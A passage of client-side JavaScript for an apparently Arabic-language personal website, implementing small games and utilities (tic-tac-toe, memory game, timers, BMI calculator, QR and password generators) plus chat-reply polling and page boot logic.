      const wins=[[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
      function draw(){
        el.innerHTML='';
        board.forEach((v,i)=>{
          const b=document.createElement('button');
          b.style.cssText='aspect-ratio:1;background:var(--card);border:1px solid var(--border);border-radius:10px;font-size:32px;font-weight:800;cursor:pointer;color:var(--accent);font-family:inherit';
          b.textContent=v;
          b.addEventListener('click', ()=>{
            if(done||board[i]) return;
            board[i]=turn;
            const w=wins.find(w=>w.every(x=>board[x]===turn));
            if(w){done=true;st.textContent='🏆 '+turn+' فاز!';draw();return}
            if(board.every(x=>x)){done=true;st.textContent='تعادل';draw();return}
            turn = turn==='X'?'O':'X';
            st.textContent='دور '+turn;
            draw();
          });
          el.appendChild(b);
        });
      }
      draw();
      $a('#tttReset').addEventListener('click', ()=>{board=['','','','','','','','',''];turn='X';done=false;st.textContent='دورك (X)';draw()});
    }

    if(app==='guess'){
      let secret = Math.floor(Math.random()*100)+1, tries=0;
      const inp=$a('#gIn'), msg=$a('#gMsg');
      $a('#gGo').addEventListener('click', ()=>{
        const v=+inp.value;
        if(!v||v<1||v>100){msg.textContent='اكتب رقم 1-100';return}
        tries++;
        if(v===secret){msg.textContent='🎉 صح! خمّنت في '+tries+' محاولة';secret=Math.floor(Math.random()*100)+1;tries=0;}
        else if(v<secret) msg.textContent='أعلى ('+tries+')';
        else msg.textContent='أقل ('+tries+')';
        inp.value='';
      });
      $a('#gReset').addEventListener('click', ()=>{secret=Math.floor(Math.random()*100)+1;tries=0;msg.textContent='خمّن رقم 1-100';inp.value=''});
    }

    if(app==='memory'){
      const icons=['🍎','🍌','🍇','🍓','🥝','🍑','🍒','🥭'];
      let cards=[...icons,...icons].sort(()=>Math.random()-.5);
      let flipped=[], matched=0, lock=false;
      const el=$a('#mBoard'), st=$a('#mStatus');
      function draw(){
        el.innerHTML='';
        cards.forEach((v,i)=>{
          const b=document.createElement('button');
          const isOpen = flipped.includes(i) || v==='✓';
          b.style.cssText='aspect-ratio:1;background:var(--card);border:1px solid var(--border);border-radius:10px;font-size:26px;cursor:pointer;font-family:inherit';
          b.textContent = v==='✓'?'✓':(isOpen?icons[icons.indexOf(v)]:'?');
          b.addEventListener('click', ()=>{
            if(lock||flipped.includes(i)||v==='✓') return;
            flipped.push(i);
            draw();
            if(flipped.length===2){
              lock=true;
              setTimeout(()=>{
                const [a,b2]=flipped;
                if(cards[a]===cards[b2]){cards[a]='✓';cards[b2]='✓';matched++;st.textContent='Matches: '+matched;
                  if(matched===8) st.textContent='🎉 فزت!';}
                flipped=[];lock=false;draw();
              }, 700);
            }
          });
          el.appendChild(b);
        });
      }
      draw();
      $a('#mReset').addEventListener('click', ()=>{cards=[...icons,...icons].sort(()=>Math.random()-.5);flipped=[];matched=0;lock=false;st.textContent='Matches: 0';draw()});
    }

    if(app==='rps'){
      const res=$a('#rpsRes');
      appContent.querySelectorAll('.rpsBtn').forEach(b=>{
        b.addEventListener('click', ()=>{
          const opts=['rock','paper','scissors'];
          const me=b.dataset.v, ai=opts[Math.floor(Math.random()*3)];
          const m={rock:'✊',paper:'✋',scissors:'✌️'};
          let out = 'أنت '+m[me]+' - '+m[ai]+' AI → ';
          if(me===ai) out+='تعادل';
          else if((me==='rock'&&ai==='scissors')||(me==='paper'&&ai==='rock')||(me==='scissors'&&ai==='paper')) out+='🎉 فزت';
          else out+='😢 خسرت';
          res.textContent = out;
        });
      });
    }

    if(app==='dice'){
      $a('#diceGo').addEventListener('click', ()=>{
        const n=Math.floor(Math.random()*6)+1;
        const icons=['⚀','⚁','⚂','⚃','⚄','⚅'];
        $a('#diceRes').textContent = icons[n-1];
      });
    }

    if(app==='flip'){
      $a('#flipGo').addEventListener('click', ()=>{
        $a('#flipRes').textContent = Math.random()<.5?'👑':'🪙';
      });
    }

    if(app==='timer'){
      let t=null, rem=0;
      const disp=$a('#tDisp'), inp=$a('#tMin');
      $a('#tGo').addEventListener('click', ()=>{
        rem=(+inp.value||1)*60;
        clearInterval(t);
        t=setInterval(()=>{
          rem--;
          if(rem<=0){clearInterval(t);disp.textContent='00:00';return}
          const m=Math.floor(rem/60), s=rem%60;
          disp.textContent = String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
        }, 1000);
      });
      $a('#tStop').addEventListener('click', ()=>{clearInterval(t);rem=0;disp.textContent='00:00'});
    }

    if(app==='stopwatch'){
      let t=null, start=0, elapsed=0;
      const disp=$a('#swDisp');
      function fmt(ms){
        const s=Math.floor(ms/1000), m=Math.floor(s/60), sec=s%60, cs=Math.floor((ms%1000)/10);
        return String(m).padStart(2,'0')+':'+String(sec).padStart(2,'0')+'.'+String(cs).padStart(2,'0');
      }
      $a('#swStart').addEventListener('click', ()=>{
        if(t){clearInterval(t);t=null;elapsed += Date.now()-start;return}
        start=Date.now();
        t=setInterval(()=>disp.textContent=fmt(elapsed+(Date.now()-start)), 50);
      });
      $a('#swReset').addEventListener('click', ()=>{clearInterval(t);t=null;elapsed=0;disp.textContent='00:00.00'});
    }

    if(app==='random'){
      $a('#rGo').addEventListener('click', ()=>{
        const a=+$a('#rMin').value||1, b=+$a('#rMax').value||100;
        $a('#rRes').textContent = Math.floor(Math.random()*(b-a+1))+a;
      });
    }

    if(app==='notes'){
      const t=$a('#ntxt'), st=$a('#nstat');
      t.value = localStorage.getItem('tj_notes') || '';
      $a('#nsave').addEventListener('click', ()=>{
        localStorage.setItem('tj_notes', t.value);
        st.textContent='✅ '+new Date().toLocaleTimeString('ar-EG');
        setTimeout(()=>st.textContent='', 2500);
      });
    }

    if(app==='qrgen'){
      $a('#qrGo').addEventListener('click', ()=>{
        const t = $a('#qrText').value.trim();
        if(!t) return;
        $a('#qrOut').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(t)+'" style="background:#fff;padding:8px;border-radius:10px">';
      });
    }

    if(app==='bmi'){
      $a('#bmiGo').addEventListener('click', ()=>{
        const w = +$a('#bmiW').value, h = +$a('#bmiH').value/100;
        if(!w||!h) return;
        const bmi = (w/(h*h)).toFixed(1);
        let cat = bmi<18.5?'نقص':bmi<25?'طبيعي':bmi<30?'زيادة':'سمنة';
        $a('#bmiRes').innerHTML = bmi + '<br><span style="font-size:14px">'+cat+'</span>';
      });
    }

    if(app==='password'){
      $a('#passGo').addEventListener('click', ()=>{
        const len = +$a('#passLen').value || 16;
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}';
        let pass='';
        for(let i=0;i<len;i++) pass += chars[Math.floor(Math.random()*chars.length)];
        $a('#passRes').textContent = pass;
      });
      $a('#passCopy').addEventListener('click', ()=>{
        const p = $a('#passRes').textContent;
        if(p) navigator.clipboard.writeText(p).then(()=>toast('✅ تم النسخ'));
      });
    }
  }

  function getVisitorId(){
    let id = localStorage.getItem('tj_vid');
    if(!id){ id = 'v_' + Math.random().toString(36).slice(2) + Date.now().toString(36); localStorage.setItem('tj_vid', id); }
    return id;
  }

  // Poll replies every 15 sec
  setInterval(async ()=>{
    if(!SYNC.isReady()) return;
    const cloud = await SYNC.pull();
    if(cloud && cloud.replies){
      state.replies = cloud.replies;
      if(cloud.messages) state.messages = cloud.messages;
      renderChatReplies();
    }
  }, 15000);

  // Keyboard admin
  document.addEventListener('keydown', e=>{
    if(e.ctrlKey && e.shiftKey && e.key==='A') location.href='admin.html';
  });

  // Boot
  boot().then(()=>{
    tickAge(); setInterval(tickAge, 1000);
    revealOnScroll();
    setTimeout(()=>{ const l=$('#loader'); if(l) l.classList.add('hide'); }, 500);
  });

})();
